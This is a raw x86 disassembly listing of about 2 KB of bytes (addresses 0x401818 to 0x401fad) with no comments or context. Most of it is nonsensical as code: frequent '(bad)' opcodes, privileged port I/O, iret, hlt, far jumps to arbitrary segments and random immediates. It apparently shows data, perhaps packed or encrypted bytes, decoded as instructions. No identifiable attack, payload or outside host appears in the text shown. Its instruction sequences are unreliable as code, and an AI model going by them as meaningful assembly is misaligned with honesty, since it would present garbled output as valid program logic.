  401818:	lods   eax,DWORD PTR ds:[esi]
  401819:	xchg   ebp,eax
  40181a:	sbb    esp,ebx
  40181c:	push   es
  40181d:	fwait
  40181e:	pushf  
  40181f:	shr    DWORD PTR [ebx+ebx*4+0x7f],1
  401823:	data16 inc ch
  401826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401827:	xchg   edx,eax
  401828:	jae    0x401858
  40182a:	add    al,0x2b
  40182c:	sbb    DWORD PTR [esp+eax*8-0x19269669],esi
  401833:	(bad)  
  401834:	push   edi
  401835:	repnz pusha 
  401837:	int    0x8a
  401839:	iret   
  40183a:	inc    ebp
  40183b:	lea    eax,[edx-0xae15aea]
  401841:	jbe    0x401835
  401843:	inc    esi
  401844:	dec    esp
  401845:	iret   
  401846:	push   esp
  401847:	(bad)  
  401848:	push   edi
  401849:	cmp    ah,BYTE PTR [bx]
  40184c:	sbb    DWORD PTR [edx],ecx
  40184e:	mov    al,0x15
  401850:	mov    ds:0xc3e00b34,eax
  401855:	mov    al,0xd2
  401857:	sti    
  401858:	inc    ebx
  401859:	scas   al,BYTE PTR es:[edi]
  40185a:	ins    BYTE PTR es:[edi],dx
  40185b:	dec    ebx
  40185c:	mov    ebx,0xedbc374f
  401861:	nop
  401862:	xor    BYTE PTR [ebx],bl
  401864:	jae    0x401836
  401866:	fisubr WORD PTR [esi+ebp*4-0x275c1636]
  40186d:	mov    ecx,0x2367701f
  401872:	jg     0x401880
  401874:	mov    edx,0xdc0a4869
  401879:	into   
  40187a:	sub    DWORD PTR [esi+0x611ad99a],edi
  401880:	jb     0x4018d5
  401882:	(bad)  
  401883:	gs and ecx,esi
  401886:	sti    
  401887:	sbb    eax,0x3250285
  40188c:	into   
  40188d:	div    DWORD PTR [edx+edx*8-0x4e]
  401891:	pop    esi
  401892:	sbb    DWORD PTR [eax],ecx
  401894:	inc    edx
  401895:	adc    bh,BYTE PTR [ebx]
  401897:	mov    al,ds:0xa65378c
  40189c:	ja     0x4018db
  40189e:	(bad)  
  4018a0:	pop    ds
  4018a1:	ins    BYTE PTR es:[edi],dx
  4018a2:	push   ds
  4018a3:	xchg   esi,eax
  4018a4:	popa   
  4018a5:	stos   BYTE PTR es:[edi],al
  4018a6:	test   eax,0xd0ad2d8
  4018ab:	cmp    esi,DWORD PTR [edi+0x283b79dc]
  4018b1:	pop    edi
  4018b3:	jne    0x4018bc
  4018b5:	enter  0x6db5,0xa8
  4018b9:	sub    al,0x40
  4018bb:	stos   BYTE PTR es:[edi],al
  4018bc:	or     DWORD PTR gs:0x4013fe00,eax
  4018c3:	inc    edx
  4018c4:	mov    ds:0x311a9913,al
  4018c9:	aaa    
  4018ca:	xchg   esp,eax
  4018cb:	push   edi
  4018cc:	outs   dx,DWORD PTR ds:[esi]
  4018cd:	xor    DWORD PTR [ebx+0x3f],0xea0a5e0
  4018d4:	lds    edx,FWORD PTR [eax+0x32]
  4018d7:	jo     0x40185a
  4018d9:	push   es
  4018da:	jle    0x401943
  4018dc:	mov    bh,0x7c
  4018de:	mov    ch,0x9f
  4018e0:	xor    eax,DWORD PTR [esi]
  4018e2:	mov    bl,0x6f
  4018e4:	inc    edi
  4018e5:	shl    DWORD PTR [edx+0x1d],cl
  4018e8:	out    0x96,eax
  4018ea:	ret    
  4018eb:	bound  esp,QWORD PTR [ebx+0x34]
  4018ee:	and    al,0x95
  4018f0:	sar    DWORD PTR [edi+0x6daa5337],1
  4018f6:	jae    0x401879
  4018f8:	xchg   ecx,eax
  4018f9:	add    BYTE PTR [ebx],bl
  4018fb:	test   eax,0x4f0cf869
  401900:	jmp    0x401936
  401902:	imul   edx,esp,0x4c
  401905:	and    eax,0xbdb98a4f
  40190a:	sbb    al,0xb1
  40190c:	out    0x52,eax
  40190e:	push   ds
  40190f:	cwde   
  401910:	(bad)  
  401911:	retf   0x7808
  401914:	mov    gs,WORD PTR [ebx-0x58]
  401917:	jp     0x4018a3
  401919:	inc    ecx
  40191a:	repnz scas eax,DWORD PTR es:[edi]
  40191c:	dec    ebp
  40191d:	pop    es
  40191e:	sbb    DWORD PTR [edx+ebx*2-0x55951154],edi
  401925:	pusha  
  401926:	and    edi,DWORD PTR [edi]
  401928:	retf   0xd7a9
  40192b:	es hlt 
  40192d:	fild   QWORD PTR [ebx-0x1100d612]
  401933:	mov    ch,BYTE PTR [ebx+0x18]
  401936:	mov    bh,0x5
  401938:	fdiv   QWORD PTR [ecx]
  40193a:	lock (bad) 
  40193c:	stc    
  40193d:	cdq    
  40193e:	push   0xa341a5a1
  401943:	ficomp DWORD PTR [edi+0x3044f110]
  401949:	leave  
  40194a:	sub    ebp,ecx
  40194c:	fdiv   QWORD PTR [esi]
  40194e:	mov    esi,0xae405200
  401953:	push   cs
  401954:	rol    BYTE PTR [esp+ebp*2-0x7f9203a1],1
  40195b:	shl    BYTE PTR [edx+0x20905472],0x25
  401962:	xlat   BYTE PTR ds:[ebx]
  401963:	inc    eax
  401964:	mov    eax,0xac64637c
  401969:	push   ss
  40196a:	scas   eax,DWORD PTR es:[edi]
  40196b:	pop    ebx
  40196c:	mov    esi,DWORD PTR [ebp+0x7da5f8cd]
  401972:	fnsave [edx+0x5a]
  401975:	mov    edi,0x4c73b9e3
  40197a:	or     BYTE PTR ds:0x16768ffc,bh
  401980:	pop    es
  401981:	(bad)  
  401982:	iret   
  401983:	mov    ah,dl
  401985:	ins    DWORD PTR es:[edi],dx
  401986:	into   
  401987:	jae    0x4019b8
  401989:	in     al,0x6c
  40198b:	jnp    0x401941
  40198d:	and    BYTE PTR [ebx],0xf9
  401990:	and    eax,0x2f1e8de4
  401995:	lods   al,BYTE PTR ds:[esi]
  401996:	lahf   
  401997:	and    dl,bl
  401999:	ss pop esp
  40199b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40199c:	and    BYTE PTR [ebx-0x6c],0xbd
  4019a0:	sub    cl,BYTE PTR [edi-0x39]
  4019a3:	stc    
  4019a4:	out    0x60,al
  4019a6:	ret    
  4019a7:	push   edx
  4019a8:	dec    edi
  4019a9:	js     0x401a00
  4019ab:	inc    esi
  4019ac:	out    dx,al
  4019ad:	or     DWORD PTR [edi+0x1cbf0e9d],esp
  4019b3:	adc    eax,0x18c27016
  4019b8:	mov    ah,0x79
  4019ba:	fcomp  st(1)
  4019bc:	cmp    BYTE PTR [ecx],dh
  4019be:	and    BYTE PTR [ebp-0x19],bl
  4019c1:	inc    esp
  4019c2:	jle    0x401a42
  4019c4:	sub    al,0x35
  4019c6:	pusha  
  4019c7:	das    
  4019c8:	mov    esp,0xc76e65db
  4019cd:	neg    DWORD PTR [ebx]
  4019cf:	adc    eax,0x30d5b1a5
  4019d4:	sbb    eax,esi
  4019d6:	int3   
  4019d7:	jns    0x401a44
  4019d9:	mov    dl,0xdf
  4019db:	shl    BYTE PTR ds:0xebb9d621,1
  4019e1:	cld    
  4019e2:	dec    ebp
  4019e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019e4:	mov    ds:0xb05dfede,al
  4019e9:	xchg   BYTE PTR [ebx-0x8bc8e1a],dh
  4019ef:	fs stc 
  4019f1:	or     esp,ebx
  4019f3:	lahf   
  4019f4:	dec    ecx
  4019f5:	sub    dl,BYTE PTR [edx]
  4019f7:	pop    ebx
  4019f8:	push   edx
  4019f9:	sub    ch,BYTE PTR [edx+0x67]
  4019fc:	fimul  DWORD PTR [ebp+0x16]
  4019ff:	inc    edx
  401a00:	aaa    
  401a01:	xchg   ebp,eax
  401a02:	jnp    0x4019d5
  401a04:	xchg   edx,eax
  401a05:	add    eax,0xa5474900
  401a0a:	adc    eax,0xc77a2924
  401a0f:	pushf  
  401a10:	loopne 0x401a86
  401a12:	jne    0x4019f0
  401a14:	inc    esi
  401a15:	outs   dx,BYTE PTR ss:[esi]
  401a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a18:	out    0x9d,eax
  401a1a:	daa    
  401a1b:	push   esp
  401a1c:	adc    al,BYTE PTR [esi+ebx*8+0x5a]
  401a20:	pop    edi
  401a21:	popa   
  401a22:	sahf   
  401a23:	fcom   QWORD PTR [ebx+0x20e7587b]
  401a29:	cmp    bh,al
  401a2b:	sbb    BYTE PTR [edx],ah
  401a2d:	dec    edx
  401a2e:	test   eax,edx
  401a30:	repz push ebx
  401a32:	xchg   eax,edi
  401a34:	(bad)  
  401a35:	cdq    
  401a36:	push   ecx
  401a37:	std    
  401a38:	cld    
  401a39:	and    al,0x5
  401a3b:	out    0x47,eax
  401a3d:	ret    0xb466
  401a40:	aas    
  401a41:	add    cl,BYTE PTR [ebx+edx*2]
  401a44:	daa    
  401a45:	pusha  
  401a46:	stc    
  401a47:	xor    al,0x2d
  401a49:	fsubr  st(3),st
  401a4b:	jecxz  0x401a99
  401a4d:	dec    esp
  401a4e:	push   esp
  401a4f:	cmp    al,0xf6
  401a51:	and    ebx,eax
  401a53:	pop    ss
  401a54:	addr16 push ebx
  401a56:	cmc    
  401a57:	and    al,0xa6
  401a59:	xlat   BYTE PTR ds:[ebx]
  401a5a:	jl     0x401aae
  401a5c:	dec    ecx
  401a5d:	mov    bh,0x92
  401a5f:	mov    cl,0x12
  401a61:	pop    edx
  401a62:	mov    al,0xf2
  401a64:	jge    0x401a43
  401a66:	mov    esi,0x2f2a004c
  401a6b:	out    dx,eax
  401a6c:	sub    DWORD PTR [edi-0x2dd3d1d6],esp
  401a72:	stos   BYTE PTR es:[edi],al
  401a73:	or     edi,ebp
  401a75:	out    dx,eax
  401a76:	mov    eax,0x70fa0d28
  401a7b:	jle    0x401aef
  401a7d:	adc    bl,BYTE PTR [ebx-0x2]
  401a80:	push   es
  401a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a82:	test   BYTE PTR ds:0xc6eea264,ch
  401a88:	(bad)  
  401a89:	mov    bl,0x8b
  401a8b:	or     edx,DWORD PTR [edx]
  401a8d:	or     dh,BYTE PTR [eax+0x77]
  401a90:	mov    WORD PTR [ebx+ebp*4],?
  401a93:	lds    ebx,FWORD PTR [ebx+0x6a]
  401a96:	cmp    ch,BYTE PTR ds:0x2345337a
  401a9c:	mov    ebp,0x641a436d
  401aa1:	xor    DWORD PTR [eax],ebx
  401aa3:	sahf   
  401aa4:	pop    ecx
  401aa5:	mov    ds:0xf326df39,al
  401aaa:	xchg   ebp,eax
  401aab:	(bad)  
  401aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aad:	adc    eax,0xb02b5720
  401ab2:	lods   al,BYTE PTR ds:[esi]
  401ab3:	push   es
  401ab4:	in     eax,dx
  401ab5:	add    BYTE PTR [edx+0x24],dl
  401ab8:	in     al,dx
  401ab9:	add    ebx,DWORD PTR [ebp+edx*4+0x3152ea0e]
  401ac0:	les    esp,FWORD PTR [esi]
  401ac2:	jle    0x401b33
  401ac4:	rcr    BYTE PTR [edx],cl
  401ac6:	imul   esi,DWORD PTR [ebp-0x29],0x35
  401aca:	jnp    0x401ab3
  401acc:	mov    al,ds:0x6dc764a1
  401ad1:	iret   
  401ad2:	add    ah,bh
  401ad4:	sbb    esp,DWORD PTR ds:0xfcc3505b
  401ada:	cmp    al,0x4b
  401adc:	fcom   st(1)
  401ade:	sub    ebx,edi
  401ae0:	mov    ecx,?
  401ae2:	sbb    cl,BYTE PTR ds:0x8d49e03c
  401ae8:	(bad)  
  401aeb:	jl     0x401b52
  401aed:	imul   ebx,ecx,0x3fded1d5
  401af3:	push   esi
  401af4:	repnz scas al,BYTE PTR es:[edi]
  401af6:	rol    BYTE PTR ds:0x1a69caa1,1
  401afc:	jnp    0x401ac7
  401afe:	scas   eax,DWORD PTR es:[edi]
  401aff:	or     ecx,DWORD PTR [edi+edi*2]
  401b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b03:	push   ebp
  401b04:	dec    ebp
  401b05:	daa    
  401b06:	scas   al,BYTE PTR es:[edi]
  401b07:	or     al,0xcd
  401b09:	cmp    ecx,edi
  401b0b:	stc    
  401b0c:	cmp    esi,ebp
  401b0e:	popf   
  401b0f:	push   ebp
  401b10:	xor    esi,esp
  401b12:	pushf  
  401b13:	nop
  401b14:	idiv   DWORD PTR [edx+eax*2]
  401b17:	shl    BYTE PTR [ebp-0x1c],1
  401b1a:	mov    ecx,0x215f63a6
  401b1f:	je     0x401ad9
  401b21:	push   esi
  401b22:	stos   DWORD PTR es:[edi],eax
  401b23:	mov    DWORD PTR [eax-0x27],edi
  401b26:	gs stos DWORD PTR es:[edi],eax
  401b28:	mov    eax,ds:0x5f6a3c1c
  401b2d:	scas   al,BYTE PTR es:[edi]
  401b2e:	dec    ebx
  401b2f:	imul   ecx,eax,0xffffff8d
  401b32:	mov    ds:0xc098bf04,al
  401b37:	je     0x401ac8
  401b39:	xor    al,0x1a
  401b3b:	mov    DWORD PTR [edx-0x6bd88725],esi
  401b41:	xor    al,0x9e
  401b43:	in     eax,0x44
  401b45:	sbb    ebp,DWORD PTR [esi]
  401b47:	add    eax,0xb
  401b4a:	dec    esi
  401b4b:	or     eax,0x5751e850
  401b50:	push   eax
  401b51:	test   BYTE PTR [ebx-0x46],al
  401b54:	mov    cl,0xd9
  401b56:	xchg   DWORD PTR [edi],edi
  401b58:	sub    eax,0x3310c637
  401b5d:	dec    edi
  401b5e:	mov    ah,BYTE PTR [edx-0x5e]
  401b61:	stc    
  401b62:	cdq    
  401b63:	fstp   DWORD PTR [ebx+0x5a727fac]
  401b69:	retf   
  401b6a:	push   ss
  401b6b:	fs sbb eax,0xcfc689e5
  401b71:	adc    esp,ebx
  401b73:	push   0x2897ee02
  401b78:	pop    edx
  401b79:	or     al,0xbe
  401b7b:	or     BYTE PTR [eax+0x0],dh
  401b7e:	sar    BYTE PTR [ebx-0x2f67169b],0x1b
  401b85:	jmp    0x2729:0xde94dd20
  401b8c:	jmp    0x401b79
  401b8e:	repnz mov es,WORD PTR [edi]
  401b91:	mov    ah,ah
  401b93:	mov    bh,0x5e
  401b95:	fdiv   QWORD PTR [ebx]
  401b97:	sar    al,1
  401b99:	das    
  401b9a:	sub    eax,0x383e4fc9
  401b9f:	jo     0x401bc1
  401ba1:	inc    eax
  401ba2:	xchg   ecx,eax
  401ba3:	fnstenv [esi-0x31fdfa6]
  401ba9:	push   esi
  401baa:	or     al,0x7d
  401bac:	fimul  DWORD PTR [ebp+0x516801c8]
  401bb2:	sub    BYTE PTR [edi+ebx*8],cl
  401bb5:	dec    eax
  401bb6:	lock xor eax,DWORD PTR [ecx]
  401bb9:	inc    ebp
  401bba:	(bad)  
  401bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bbd:	mov    ebp,0xab1b3827
  401bc2:	jne    0x401b7a
  401bc4:	or     eax,0xcef71d73
  401bc9:	icebp  
  401bca:	in     eax,dx
  401bcb:	mov    ch,0x34
  401bcd:	aam    0xcd
  401bcf:	xor    bl,BYTE PTR [ebx+0x28]
  401bd2:	rol    DWORD PTR [ecx-0x1d],cl
  401bd5:	(bad)  [esi]
  401bd7:	mov    WORD PTR [ecx-0x672ccb2],?
  401bdd:	pop    ss
  401bde:	adc    BYTE PTR ds:0xaa222b10,bl
  401be4:	cmp    al,0x14
  401be6:	popa   
  401be7:	mov    eax,ds:0xda93069b
  401bec:	addr16 fs push edx
  401bef:	aas    
  401bf0:	lock sub al,0xe
  401bf3:	dec    ebp
  401bf4:	sbb    BYTE PTR [edx+eax*1-0x65],ch
  401bf8:	add    eax,0x747caa24
  401bfd:	cmc    
  401bfe:	leave  
  401bff:	inc    ecx
  401c00:	and    eax,0xddf905b8
  401c05:	push   cs
  401c06:	xor    BYTE PTR [ebp-0x183f6086],0x29
  401c0d:	enter  0x9271,0xd3
  401c11:	aam    0xce
  401c13:	pop    ss
  401c14:	imul   ebp,DWORD PTR [ecx+0x60],0xe244caef
  401c1b:	shr    DWORD PTR [eax],1
  401c1d:	and    cl,BYTE PTR [ebp+0x48]
  401c20:	push   ebx
  401c21:	mov    bh,0x2
  401c23:	pop    ebp
  401c24:	cmp    al,0x70
  401c26:	sti    
  401c27:	xchg   edx,eax
  401c28:	sub    ebx,DWORD PTR [ebx+0x4a92f7f4]
  401c2e:	mov    esi,DWORD PTR [edi+0x18637768]
  401c34:	int3   
  401c35:	dec    ebx
  401c36:	test   BYTE PTR [edx],0xab
  401c39:	jl     0x401c77
  401c3b:	jg     0x401c4c
  401c3d:	in     eax,dx
  401c3e:	jge    0x401be1
  401c40:	fistp  DWORD PTR [esi-0x19111f7]
  401c46:	adc    al,0x84
  401c48:	push   es
  401c49:	mov    eax,0x44d375fe
  401c4e:	das    
  401c4f:	inc    edx
  401c50:	sahf   
  401c51:	and    eax,0x4f120a15
  401c56:	gs jne 0x401c1e
  401c59:	out    dx,eax
  401c5a:	push   esp
  401c5b:	in     eax,dx
  401c5c:	stos   BYTE PTR es:[edi],al
  401c5d:	dec    edi
  401c5e:	mov    eax,0x23af937a
  401c63:	imul   ecx,DWORD PTR [esi+0x16],0x316c00d7
  401c6a:	retf   
  401c6b:	mov    bl,0xcf
  401c6d:	dec    ebp
  401c6e:	push   es
  401c6f:	dec    edi
  401c70:	mov    ds:0x7959f282,eax
  401c75:	shl    DWORD PTR [edx+0x31ca348d],1
  401c7b:	and    eax,0xf7300026
  401c80:	adc    al,0x4
  401c82:	jno    0x401c14
  401c84:	jecxz  0x401cff
  401c86:	aam    0x6a
  401c88:	std    
  401c89:	mov    bl,0x77
  401c8b:	mov    dl,0x16
  401c8d:	outs   dx,DWORD PTR ds:[esi]
  401c8e:	in     eax,0x9
  401c90:	mov    ds:0xd9348ee5,al
  401c95:	xchg   edx,eax
  401c96:	jg     0x401cfb
  401c98:	sub    bh,al
  401c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c9b:	bound  ebx,QWORD PTR [edx+0x3f]
  401c9e:	mov    cs,WORD PTR [eax-0x2fffc112]
  401ca4:	xchg   ebx,eax
  401ca5:	mov    ecx,eax
  401ca7:	dec    esi
  401ca8:	fcomi  st,st(3)
  401caa:	mov    ebx,0xf85ce5d4
  401caf:	push   0xffffffd7
  401cb1:	mov    eax,0xc203d6d1
  401cb6:	mov    esi,0xe09bf425
  401cbb:	sub    BYTE PTR [eax-0x6df02e71],dh
  401cc1:	aaa    
  401cc2:	or     ecx,DWORD PTR [edi-0x48]
  401cc5:	stc    
  401cc6:	inc    esi
  401cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cc8:	bswap  esp
  401cca:	dec    DWORD PTR [edx-0x3f]
  401ccd:	lods   al,BYTE PTR ds:[esi]
  401cce:	sbb    al,0x49
  401cd0:	data16 ins BYTE PTR es:[edi],dx
  401cd2:	fnsave [ebx]
  401cd4:	jns    0x401ce3
  401cd6:	ffree  st(5)
  401cd8:	leave  
  401cd9:	iret   
  401cda:	sbb    ebp,esp
  401cdc:	dec    esp
  401cdd:	ds push esp
  401cdf:	scas   al,BYTE PTR es:[edi]
  401ce0:	and    BYTE PTR [edi+0x56],bh
  401ce3:	pop    edx
  401ce4:	in     eax,dx
  401ce5:	and    ah,BYTE PTR [esi]
  401ce7:	and    cl,BYTE PTR [ecx+0x52]
  401cea:	and    esi,esi
  401cec:	out    dx,al
  401ced:	mov    ebp,edi
  401cef:	adc    ah,dh
  401cf1:	or     DWORD PTR [ecx],esp
  401cf3:	inc    ebp
  401cf4:	retf   0xd0f5
  401cf7:	pop    esi
  401cf8:	stos   DWORD PTR es:[edi],eax
  401cf9:	retf   
  401cfa:	add    esp,eax
  401cfc:	daa    
  401cfd:	mov    bh,0x30
  401cff:	int    0xac
  401d01:	es out dx,eax
  401d03:	inc    eax
  401d04:	inc    ebp
  401d05:	jge    0x401ce8
  401d07:	shr    BYTE PTR [edi+0x61],0xd0
  401d0b:	or     esi,DWORD PTR [edx]
  401d0d:	ret    0x9b16
  401d10:	rcl    DWORD PTR [esi-0x9],1
  401d13:	jbe    0x401d3f
  401d15:	mov    ecx,ds
  401d17:	add    ah,BYTE PTR [edi-0x7e]
  401d1a:	sahf   
  401d1b:	and    eax,0x45b00dd7
  401d20:	add    al,0x2b
  401d22:	fisub  DWORD PTR [ebp+0x19a20dcd]
  401d28:	xor    BYTE PTR [ecx],ch
  401d2a:	sbb    eax,0x356cbebe
  401d2f:	or     eax,0xa67ccc0f
  401d34:	xchg   ebx,eax
  401d35:	and    dl,BYTE PTR [ecx-0x53]
  401d38:	push   es
  401d39:	sbb    al,0x67
  401d3b:	ins    DWORD PTR es:[edi],dx
  401d3c:	mov    eax,ds:0x5c3368fb
  401d41:	dec    edi
  401d42:	stos   BYTE PTR es:[edi],al
  401d43:	cs jp  0x401d5b
  401d46:	out    0x15,al
  401d48:	icebp  
  401d49:	enter  0x3585,0xf8
  401d4d:	add    BYTE PTR [edx-0x1048d6b2],bh
  401d53:	pop    edi
  401d54:	and    al,al
  401d56:	imul   ecx,esp,0x28ea042f
  401d5c:	int3   
  401d5d:	rep lods eax,DWORD PTR ds:[esi]
  401d5f:	shl    BYTE PTR [ebx+0x80c9f24],cl
  401d65:	les    ebp,FWORD PTR [esi-0x54]
  401d68:	sti    
  401d69:	je     0x401d73
  401d6b:	cmp    cl,dh
  401d6d:	adc    edx,DWORD PTR [eax-0x76]
  401d70:	lods   eax,DWORD PTR ds:[esi]
  401d71:	xor    BYTE PTR [ebx],ch
  401d73:	in     eax,0x31
  401d75:	pop    edx
  401d76:	or     DWORD PTR [ebx+0x32],0xef80083e
  401d7d:	scas   eax,DWORD PTR es:[edi]
  401d7e:	lds    ecx,FWORD PTR [ebp-0x30]
  401d81:	or     ebx,DWORD PTR [edx-0x5a]
  401d84:	fsubr  st(2),st
  401d86:	in     eax,0x56
  401d88:	mov    ds:0x6b0c4b8b,eax
  401d8d:	in     eax,dx
  401d8e:	daa    
  401d8f:	jecxz  0x401d9d
  401d91:	lods   al,BYTE PTR ds:[esi]
  401d92:	repz out 0x90,eax
  401d95:	push   ss
  401d96:	call   0x9728:0x7cde0a67
  401d9d:	std    
  401d9e:	or     BYTE PTR [ecx+0x13],bh
  401da1:	lods   eax,DWORD PTR ds:[esi]
  401da2:	(bad)  [esi]
  401da4:	out    0xe6,eax
  401da6:	or     BYTE PTR [edx+0x55],ch
  401da9:	xor    BYTE PTR [edx+0x2362224e],ch
  401daf:	dec    esp
  401db0:	adc    eax,0x1a6493ab
  401db5:	ret    0x885
  401db8:	push   ss
  401db9:	pop    edx
  401dba:	add    DWORD PTR [ebp+0x7],esi
  401dbd:	mov    es,WORD PTR [ecx+eiz*2+0x5a9b8289]
  401dc4:	jl     0x401db4
  401dc6:	out    dx,al
  401dc7:	mov    eax,0x500d9fc4
  401dcc:	dec    edi
  401dcd:	call   0x12b4:0x80359405
  401dd4:	sar    DWORD PTR [ebx+0x5e],0x62
  401dd8:	adc    DWORD PTR [esi+0x2f8d5453],0xffffffe2
  401ddf:	in     eax,0xdc
  401de1:	and    eax,0x96afb6f1
  401de6:	mov    dl,0x43
  401de8:	sti    
  401de9:	imul   ebp,DWORD PTR [edi+0x5fdca5c2],0x50
  401df0:	or     bh,BYTE PTR [eax]
  401df2:	mov    al,0x4e
  401df4:	arpl   WORD PTR [esi],si
  401df6:	repnz in al,0xf0
  401df9:	adc    dl,BYTE PTR [ebp-0x44]
  401dfc:	mov    ch,0x35
  401dfe:	push   eax
  401dff:	xchg   esi,eax
  401e00:	addr16 sub ecx,esp
  401e03:	test   eax,0x187c67c5
  401e08:	out    0x23,eax
  401e0a:	or     al,0x42
  401e0c:	sub    DWORD PTR [ebp+0x7935de9d],0x1e
  401e13:	rcr    BYTE PTR [esp+ebp*1+0x18f321f1],1
  401e1a:	pop    esp
  401e1b:	add    al,0x19
  401e1d:	test   DWORD PTR [ebp+0x6cb5fee8],0xf5dac05a
  401e27:	and    al,0xbc
  401e29:	cmp    edx,DWORD PTR [ecx]
  401e2b:	sbb    edx,eax
  401e2d:	pop    ecx
  401e2e:	push   cs
  401e2f:	mov    edi,0x1976ad02
  401e34:	fidiv  WORD PTR [ebx]
  401e36:	and    BYTE PTR [edx+0x36201f8a],ah
  401e3c:	cwde   
  401e3d:	jne    0x401eac
  401e3f:	sbb    BYTE PTR [edi],ch
  401e41:	sub    bl,BYTE PTR [esi]
  401e43:	out    dx,al
  401e44:	cdq    
  401e45:	pop    eax
  401e46:	add    DWORD PTR [edx-0x34837bfc],eax
  401e4c:	neg    BYTE PTR [edi]
  401e4e:	cmp    BYTE PTR [esp+ecx*4],0x97
  401e52:	jg     0x401e17
  401e54:	stos   BYTE PTR es:[edi],al
  401e55:	int    0xb5
  401e57:	pop    ss
  401e58:	mov    esi,DWORD PTR [ebp-0x27dfd1fe]
  401e5e:	mov    ebp,0x4948011d
  401e63:	push   0x56
  401e65:	xor    eax,0x1e9a61cb
  401e6a:	mov    gs,edx
  401e6c:	push   esp
  401e6d:	iret   
  401e6e:	inc    esp
  401e6f:	ds (bad) 
  401e71:	fcmove st,st(3)
  401e73:	pop    edx
  401e74:	(bad)  
  401e75:	(bad)  
  401e76:	push   ecx
  401e77:	or     eax,0xc3ccf6ca
  401e7c:	and    dh,BYTE PTR [ebp+0x3d]
  401e7f:	(bad)  
  401e80:	and    al,BYTE PTR [edi+eax*2-0x7e66c80f]
  401e87:	sbb    DWORD PTR [edi],0x96cd3191
  401e8d:	push   cs
  401e8e:	sub    BYTE PTR [esi],ch
  401e90:	or     bh,BYTE PTR ds:0x80feebff
  401e96:	jns    0x401e82
  401e98:	pop    esp
  401e99:	mov    dl,0x69
  401e9b:	lahf   
  401e9c:	pushfw 
  401e9e:	jae    0x401e38
  401ea0:	sbb    BYTE PTR [esi],dh
  401ea2:	aaa    
  401ea3:	mov    dl,0x91
  401ea5:	add    eax,0xf37d8041
  401eab:	jbe    0x401eb3
  401ead:	ins    BYTE PTR es:[edi],dx
  401eae:	pushf  
  401eaf:	adc    eax,0x55c2806a
  401eb4:	mov    ebp,0x58eb0212
  401eb9:	lahf   
  401eba:	push   esp
  401ebb:	adc    DWORD PTR [edi],edi
  401ebd:	cs ja  0x401e8b
  401ec0:	bound  bp,DWORD PTR [eax+eax*2]
  401ec4:	repz imul ebx,DWORD PTR [edx+esi*1],0xe1b65d37
  401ecc:	pop    edx
  401ecd:	jae    0x401e7a
  401ecf:	mov    bl,0x5a
  401ed1:	dec    ebp
  401ed2:	cli    
  401ed3:	stc    
  401ed4:	not    BYTE PTR [edx-0x3d]
  401ed7:	out    dx,eax
  401ed8:	dec    ebp
  401ed9:	ss cwde 
  401edb:	leave  
  401edc:	sub    eax,0x22609ea9
  401ee1:	pop    ecx
  401ee2:	push   eax
  401ee3:	jl     0x401eb2
  401ee5:	je     0x401f0b
  401ee7:	mov    bl,0x4e
  401ee9:	call   0x66d8:0x20f1e015
  401ef0:	adc    ebx,DWORD PTR [edi+0x1bf0dc45]
  401ef6:	mov    DWORD PTR [edx+0xde62518],edx
  401efc:	adc    eax,0x7039a93c
  401f01:	les    esp,FWORD PTR [edx-0x55]
  401f04:	sbb    eax,0xd7dcd6fb
  401f09:	inc    ecx
  401f0a:	pop    edx
  401f0b:	push   esp
  401f0c:	mov    esp,0xe7ac4c6c
  401f11:	js     0x401ef5
  401f13:	popa   
  401f14:	mov    BYTE PTR [ecx-0x3f],bh
  401f17:	add    BYTE PTR [edx],bh
  401f19:	mov    esi,DWORD PTR [esi-0xb93062c]
  401f1f:	gs (bad) 
  401f21:	(bad)  
  401f22:	out    0x68,eax
  401f24:	shl    esp,cl
  401f26:	enter  0x6b5f,0x2a
  401f2a:	rcl    DWORD PTR [edi],0x87
  401f2d:	(bad)  
  401f2f:	cdq    
  401f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f31:	inc    edx
  401f32:	add    al,0x57
  401f34:	xor    eax,0x57d422a2
  401f39:	jge    0x401f94
  401f3b:	sbb    eax,0x23956552
  401f40:	repnz cdq 
  401f42:	fs in  eax,0x3b
  401f45:	inc    eax
  401f46:	mov    edx,0x3f7067f5
  401f4b:	cdq    
  401f4c:	(bad)  
  401f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f4e:	call   0xf604dab8
  401f53:	xor    DWORD PTR [eax+0x17],eax
  401f56:	dec    ebx
  401f57:	lahf   
  401f58:	in     al,dx
  401f59:	dec    esp
  401f5a:	hlt    
  401f5b:	jmp    0x61d3:0x160a8b7
  401f62:	scas   eax,DWORD PTR es:[edi]
  401f63:	fwait
  401f64:	inc    ecx
  401f65:	cmp    ebx,0x87c39400
  401f6b:	mov    cl,0x74
  401f6d:	sub    ch,BYTE PTR [eax+0xfc632ed]
  401f73:	das    
  401f74:	sbb    al,0xfd
  401f76:	scas   al,BYTE PTR es:[edi]
  401f77:	xlat   BYTE PTR ds:[ebx]
  401f78:	(bad)
  401f7b:	into   
  401f7c:	into   
  401f7d:	imul   bl
  401f7f:	or     DWORD PTR [esi+ecx*1-0x443888e3],esp
  401f86:	adc    eax,0xe9479b9b
  401f8b:	out    dx,al
  401f8c:	pop    edx
  401f8d:	lods   al,BYTE PTR ds:[esi]
  401f8e:	sbb    al,0x65
  401f90:	xchg   ebx,eax
  401f91:	scas   eax,DWORD PTR es:[edi]
  401f92:	int3   
  401f93:	fwait
  401f94:	add    al,0x26
  401f96:	fbstp  TBYTE PTR [esi+0x4e]
  401f99:	cmp    BYTE PTR [edi-0x40],0xb6
  401f9d:	imul   esp,DWORD PTR [ebx+0x5e1317d5],0x20
  401fa4:	cmc    
  401fa5:	ror    al,cl
  401fa7:	xchg   ebx,eax
  401fa8:	enter  0x931f,0x66
  401fac:	pop    esp
  401fad:	fsubr  DWORD PTR [ebx-0x5b2763ef]
